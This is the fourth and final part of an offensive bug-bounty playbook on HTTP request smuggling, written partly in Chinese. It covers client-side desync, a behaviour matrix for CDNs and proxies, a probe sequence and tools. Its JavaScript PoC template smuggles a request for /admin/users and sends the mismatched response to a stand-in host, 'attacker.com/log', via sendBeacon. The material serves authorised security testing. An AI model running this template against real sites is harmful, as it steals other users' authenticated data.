---
name: playbook-src-http-smuggling-test-part4
description: "结构：上半原有是主线（CL.TE / TE.CL）；下半补充 + 文末附件加深 H2。先时间差确认再走私。（第 4/4 部分）"
tags: [playbook, src-hunting, http, smuggling, test]
intent: offensive
---
### 6.3 Detailed Flow

```
1. Attacker's JS on victim's browser sends fetch() to target:

   fetch('https://target.com/trigger', {
     method: 'POST',
     mode: 'no-cors',
     credentials: 'include',
     body: 'GET /victim-data HTTP/1.1\r\nHost: target.com\r\n\r\n'
   });

2. Browser sends POST to /trigger with body containing smuggled GET
3. Server responds to POST immediately (ignoring body — CL.0)
4. Smuggled "GET /victim-data" remains in the TCP buffer

5. Attacker's JS sends a follow-up request on same connection:

   fetch('https://target.com/api/me', {
     credentials: 'include'
   });

6. Server processes the leftover "GET /victim-data" instead of "GET /api/me"
7. Response mismatch — browser gets /victim-data response for /api/me request
```

### 6.4 JavaScript PoC Template

```javascript
async function desync(targetUrl, triggerPath, smuggledRequest) {
    const body = smuggledRequest;

    // Step 1: Trigger the desync (CL.0 on trigger endpoint)
    await fetch(targetUrl + triggerPath, {
        method: 'POST',
        mode: 'no-cors',
        credentials: 'include',
        body: body
    });

    // Step 2: Follow-up request on (hopefully) same connection
    const response = await fetch(targetUrl + '/api/profile', {
        credentials: 'include'
    });

    // Step 3: Exfiltrate if response is mismatched
    const data = await response.text();
    navigator.sendBeacon('https://attacker.com/log', data);
}

desync(
    'https://target.com',
    '/static/logo.png',  // CL.0-susceptible endpoint
    'GET /admin/users HTTP/1.1\r\nHost: target.com\r\n\r\n'
);
```

### 6.5 CSD Limitations

- Browser may use different connections for subsequent requests → desync fails
- `Connection: close` on server side prevents reuse
- HTTP/2 to single origin may use single connection (actually helps CSD)
- Same-site cookie policies may limit credential inclusion
- Hard to reliably predict connection reuse

### 6.6 CSD via Pause-Based Desync

```
1. Server has a timeout: if request body isn't fully received within N seconds, 
   server sends response and moves on
2. Attacker sends fetch() with:
   - Content-Length: 1000 (large)
   - Actual body: only 50 bytes + smuggled request
3. Server waits, times out, responds to partial request
4. Remaining bytes (smuggled request) stay in buffer
5. Next request on connection processes smuggled bytes
```

---

## 7. CDN / REVERSE PROXY BEHAVIOR MATRIX

### 7.1 CL + TE Handling

| Product | Dual CL+TE | Prefers | Notes |
|---|---|---|---|
| **HAProxy** | Forwards both | TE | Strips CL when TE is present (configurable) |
| **Nginx** | Rejects dual headers (400) | N/A | Strict — hard to smuggle through |
| **Apache (mod_proxy)** | Forwards both | CL | Historic CL.TE source |
| **Cloudflare** | Normalizes | TE | Strips CL when TE present; strong normalization |
| **AWS ALB** | Normalizes | Varies | Has had CL.TE vulns historically (patched) |
| **AWS CloudFront** | Normalizes | CL | May pass TE obfuscation variants |
| **Varnish** | Forwards both | TE | Configurable; default prefers TE |
| **Traefik** | Forwards both | TE | Go `net/http` based; strict chunked parsing |
| **Envoy** | Rejects dual (400) | N/A | Very strict HTTP/1.1 parsing |
| **Caddy** | Go-based; strict | TE | Similar to Envoy strictness |
| **Squid** | Forwards both | CL | Historic TE.CL source |
| **IIS (ARR)** | Forwards both | CL | Historic CL.TE/TE.CL source |

### 7.2 HTTP/2 Downgrade Behavior

| Product | H2→H1 Downgrade | TE Header Handling | CL Passthrough |
|---|---|---|---|
| **HAProxy** | Translates | May pass TE | Passes CL |
| **Nginx** | Translates | Strips TE (usually) | Passes CL |
| **Cloudflare** | Translates | Strips TE | Normalizes CL |
| **AWS ALB** | Translates | Strips TE | Passes CL |
| **AWS CloudFront** | Translates | May pass obfuscated TE | Passes CL |
| **Envoy** | Translates | Strips TE | Strict validation |
| **Traefik** | Translates | May pass TE | Passes CL |

### 7.3 GET Body Handling

| Product | Forwards GET Body | Notes |
|---|---|---|
| HAProxy | Yes | Default behavior |
| Nginx | Yes (as proxy) | Forwards if body present |
| Apache | Yes | Forwards body |
| Cloudflare | Strips | Removes GET body |
| AWS ALB | Depends on version | May strip |
| Varnish | Strips | Removes GET body |
| Envoy | Yes | Forwards |

### 7.4 Connection Reuse Behavior

| Product | Backend Connection Pooling | Impact on Smuggling |
|---|---|---|
| HAProxy | Yes (connection pool) | High risk — smuggled data affects other users |
| Nginx | Yes (keepalive upstream) | High risk |
| Cloudflare | Yes | High risk but strong normalization |
| AWS ALB | Yes | High risk |
| Envoy | Yes | Lower risk (strict parsing) |
| Varnish | Configurable | Depends on `beresp.do_stream` |

---

## 8. TESTING METHODOLOGY

### 8.1 Safe Probe Sequence

```
1. Identify architecture:
   - Check Via, Server, X-Served-By headers
   - Detect CDN (Cloudflare cf-ray, CloudFront x-amz-cf-id, etc.)

2. HTTP version probing:
   - curl --http2 https://target.com -v
   - Check if ALPN negotiation includes h2

3. Time-based desync detection:
   a. CL.TE probe:
      POST / HTTP/1.1
      Content-Length: 4
      Transfer-Encoding: chunked

      1
      A
      0

   b. If response is delayed → back-end is waiting for chunked end → CL.TE likely

4. H2 desync:
   - Send H2 request with content-length: 0 + body containing smuggled prefix
   - Follow with normal request; observe if response matches smuggled path

5. CL.0 detection:
   - Find endpoints returning without consuming body (redirects, static files)
   - Send POST with excess body, follow with normal GET
```

### 8.2 Tools

| Tool | Purpose |
|---|---|
| **Burp Suite HTTP Request Smuggler** | Automated variant scanning |
| **h2csmuggler** (GitHub) | HTTP/2 cleartext smuggling |
| **smuggler.py** (defparam) | CL.TE, TE.CL, TE.TE automation |
| **http2smugl** (GitHub) | H2-specific desync testing |
| **curl** with `--http2` / `--http1.1` | Manual H2/H1 probing |
| **hyper** (Python) | Low-level H2 frame crafting |

### 8.3 Impact Escalation Checklist

```
□ Confirmed desync variant (CL.TE / TE.CL / H2.CL / H2.TE / CL.0)
□ Can smuggle full request? (not just prefix)
□ Connection pooling enabled? (affects other users → critical)
□ Cacheable endpoints exist? (→ cache poisoning)
□ Authenticated endpoints reachable? (→ auth bypass, data theft)
□ Can reflect content in response? (→ stored XSS via cache)
□ Admin/internal paths accessible? (→ privilege escalation)
□ Client-side desync possible? (→ per-user attacks)
```

> （续前：playbook-src-http-smuggling-test 第 4/4 部分）
